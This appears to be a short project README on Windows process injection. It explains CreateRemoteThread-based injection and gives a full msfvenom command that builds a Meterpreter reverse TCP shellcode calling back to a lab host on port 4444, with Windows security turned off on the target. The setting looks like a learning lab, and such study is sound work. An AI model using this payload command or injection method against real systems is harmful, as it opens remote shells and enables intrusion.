# Windows-Process-Injection

### 1. CreateRemoteThreat Injection
To test the waters, we first implement the classic CreateRemoteThread injection which uses VirtualAllocEX() for allocation, WriteProcessMemory() for writing, and CreateRemoteThread() for execution.
The shellcode hardcoded in the cpp program is a reverse shell generated using msfvenom with the following config:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f c -a x64 --platform windows -o ~/Documents/reverse_staged.c
```
the same payload is fed to meterpreter for the reverse shell.
For this phase, no evasion or encoding are implemented and we simply deactivated Windows security on the target machine.
